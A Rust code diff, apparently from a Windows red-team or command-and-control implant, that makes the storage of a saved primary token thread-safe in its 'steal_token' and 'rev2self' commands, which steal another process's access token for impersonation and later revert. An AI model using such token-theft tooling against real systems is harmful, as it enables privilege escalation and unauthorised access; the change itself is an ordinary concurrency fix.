@@ -12,7 +12,7 @@
 #![cfg(windows)]
 
 use anyhow::{anyhow, Context, Result};
-use std::sync::Mutex;
+use std::sync::{Mutex, OnceLock};
 use winapi::um::winnt::{
     DUPLICATE_SAME_ACCESS, HANDLE, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
     TOKEN_QUERY, SecurityImpersonation, TokenImpersonation,
@@ -29,7 +29,11 @@ static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);
 /// Stores the original primary token captured on first impersonation.
 /// Populated exactly once; subsequent `steal_token` calls must NOT
 /// overwrite this — doing so would leak the handle.
-static mut SAVED_PRIMARY_TOKEN: Option<HANDLE> = None;
+static SAVED_PRIMARY_TOKEN: OnceLock<Mutex<Option<HANDLE>>> = OnceLock::new();
+
+fn saved_primary() -> &'static Mutex<Option<HANDLE>> {
+    SAVED_PRIMARY_TOKEN.get_or_init(|| Mutex::new(None))
+}
 
 // ── Logon type constants (from winnt.h) ────────────────────────────────────
 const LOGON32_LOGON_INTERACTIVE: u32 = 2;
@@ -271,16 +275,29 @@ pub fn steal_token(target_pid: u32) -> Result<String> {
     // On the very first impersonation we open our own process token and
     // stash it in SAVED_PRIMARY_TOKEN so that Rev2Self can restore it.
     // Subsequent calls do NOT overwrite it — that would leak the handle.
-    unsafe {
-        if SAVED_PRIMARY_TOKEN.is_none() {
+    {
+        let guard = saved_primary().lock().unwrap();
+        if guard.is_none() {
+            // Drop the lock before the syscall, then re-acquire to store.
+            drop(guard);
             let mut primary: HANDLE = std::ptr::null_mut();
-            let ok = winapi::um::securitybaseapi::OpenProcessToken(
-                GetCurrentProcess(),
-                TOKEN_ALL_ACCESS,
-                &mut primary,
-            );
+            let ok = unsafe {
+                winapi::um::securitybaseapi::OpenProcessToken(
+                    GetCurrentProcess(),
+                    TOKEN_ALL_ACCESS,
+                    &mut primary,
+                )
+            };
             if ok != 0 && !primary.is_null() {
-                SAVED_PRIMARY_TOKEN = Some(primary);
+                let mut guard = saved_primary().lock().unwrap();
+                // Double-check: another thread may have populated it while
+                // we were in the syscall.
+                if guard.is_none() {
+                    *guard = Some(primary);
+                } else {
+                    // Lost the race — close the extra handle.
+                    unsafe { CloseHandle(primary) };
+                }
             }
             // If OpenProcessToken fails we proceed anyway — Rev2Self will
             // fall back to RevertToSelf() which uses the process token
@@ -343,8 +360,12 @@ pub fn rev2self() -> Result<String> {
     // If we have a saved primary token, apply it to the thread directly.
     // This is more reliable than RevertToSelf when the impersonation was
     // set via SetThreadToken.  Fall back to RevertToSelf otherwise.
+    let primary_opt = {
+        let mut guard = saved_primary().lock().unwrap();
+        guard.take()
+    }; // guard dropped here — lock released before syscall.
     unsafe {
-        if let Some(primary) = SAVED_PRIMARY_TOKEN.take() {
+        if let Some(primary) = primary_opt {
             SetThreadToken(std::ptr::null_mut(), primary);
             // Close the saved primary token handle now that we've restored.
             nt_close_handle(primary as u64);
